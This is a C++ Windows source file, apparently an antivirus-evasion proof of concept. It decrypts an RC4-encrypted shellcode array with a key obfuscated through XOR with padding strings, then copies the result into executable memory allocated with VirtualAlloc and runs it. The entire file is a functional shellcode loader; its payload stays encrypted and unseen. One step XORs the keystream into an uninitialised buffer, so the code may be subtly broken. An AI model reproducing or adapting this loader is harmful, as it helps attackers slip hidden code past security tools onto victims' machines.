// sheep.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include<Windows.h>
#include<string.h>
#include "common.h"
#include "rc4.h"
#define SWAP(x, y, T) do { T SWAP = x; x = y; y = SWAP; } while (0)

void rc4_set_key(const unsigned char *buf, size_t len, rc4_key_t * key)
{
        unsigned char j = 0;
        unsigned char *state = key->state;
        int i;

        for (i = 0;  i < 256; ++i)
                state[i] = i;

        key->x = 0;
        key->y = 0;

        for (i = 0; i < 256; ++i) {
                j = j + state[i] + buf[i % len];
                SWAP(state[i], state[j],unsigned char);
        }
}

void rc4_crypt(unsigned char *buf, size_t len, rc4_key_t * key)
{
        unsigned char x;
        unsigned char y;
        unsigned char *state = key->state;
        unsigned int  i;

        x = key->x;
        y = key->y;

        for (i = 0; i < len; i++) {
                y = y + state[++x];
                SWAP(state[x], state[y],unsigned char);
                buf[i] ^= state[(state[x] + state[y]) & 0xff];
        }

        key->x = x;
        key->y = y;
}


#define DUMMY "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

int angel();
int devil();

char *dummya = DUMMY "A";
char *dummyb = DUMMY "B";
unsigned char code[]="\xb2\x00\x84\x97\xc4\xbc\x23\x8b\x72\xd3\xa7\x0b\xe4\xd5\x7a\x84\x36"
"\x31\xe1\xd0\x3a\xb0\x38\x34\x26\x3e\x3d\x4f\x82\x7f\xba\x97\xa2\x32\xc2\xdc\xd5"
"\xb2\x98\x04\x43\x96\x7f\xf7\x37\xa5\x48\x03\xec\x5e\x37\xb0\x4c\x01\x43\x50\xb4"
"\xe2\x9f\x34\x81\x27\xce\x34\x4a\x3b\x46\x95\x93\xc3\x0f\xd3\xbd\xfe\xee\x1d\xcc"
"\x4f\x3a\x66\xa4\x6b\x2f\x22\xb1\xac\x4e\x1b\x9c\xaa\x7d\x86\x7a\x57\x2c\x8e\xcf"
"\x98\x32\x50\xeb\xc4\x1b\x59\x62\xde\x8d\x03\x5d\x18\x66\xc7\x60\xd2\x93\x25\x47"
"\x45\x7d\x5e\x3f\x38\x04\xa5\xb0\x00\xaf\xfe\xab\xcd\x75\x43\xf6\xbe\x3a\x65\xe2"
"\x7c\x9d\xba\xab\x71\x86\xba\x1b\x8f\xd0\x65\x96\x40\x53\x39\x3e\x19\x90\xb3\x47"
"\xd6\xe3\xbf\x95\xde\xe9\x52\xc4\x9a\x55\xc8\x24\xce\x46\x39\xaf\xdc\xdc\x73\x19"
"\x51\xa1\xa9\x46\x55\x1b\x8c\x17\x38\xf1\x4d\x2d\xd7\x6d\x72\xfe\x14\x38\xab\x7b"
"\x5d\x34\x3b\x5e\x08\xd3\xc3\x17\x60\xa8\x9e\x61\xa9\x83\xa9\x1f\x78\xd1\x90\x51"
"\x11\xed\xd8\x4a\x20\x68\x83\x1a\xfc\xa7\x99\x3c\xbe\xd1\x1c\x61\x29\xb7\x3b\x42"
"\xe6\x64\xf9\x98\x10\x26\x6d\xa0\x58\x56\x83\x31\x2e\xf7\x8f\xf7\xe3\xa1\xc5\x75"
"\x21\xd3\xd0\x1f\x85\x9c\xa1\xbf\xf6\x5f\xf4\x36\xb2\x73\xda\x63\xcc\x54\xa6\x80"
"\x7d\xd4\x8e\x0e\xeb";

int _tmain(int argc, _TCHAR* argv[])
{


	unsigned char key[]="SILENTSIGNAL";
	char* dummya_c=dummya;
	char* dummyb_c=dummyb;

	for (int i=0;i<strlen(dummya);i++){
		key[i%strlen((char*)key)]^=dummya_c[i]^dummyb_c[i];
	}
	printf("%s",key);
	rc4_key_t rc4_key;
	rc4_set_key(key,strlen((const char*)key),&rc4_key);
	unsigned char crypted[sizeof(code)];
	rc4_crypt(crypted,sizeof(crypted),&rc4_key);
	for (int i=0;i<sizeof(code);i++){
		code[i]^=crypted[i];
		printf("\\x%02x",code[i]);
	}
	printf("DONE");
	void* p=VirtualAlloc(NULL,4096,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(p,code,sizeof(code));
	((void(*)())p)();
}




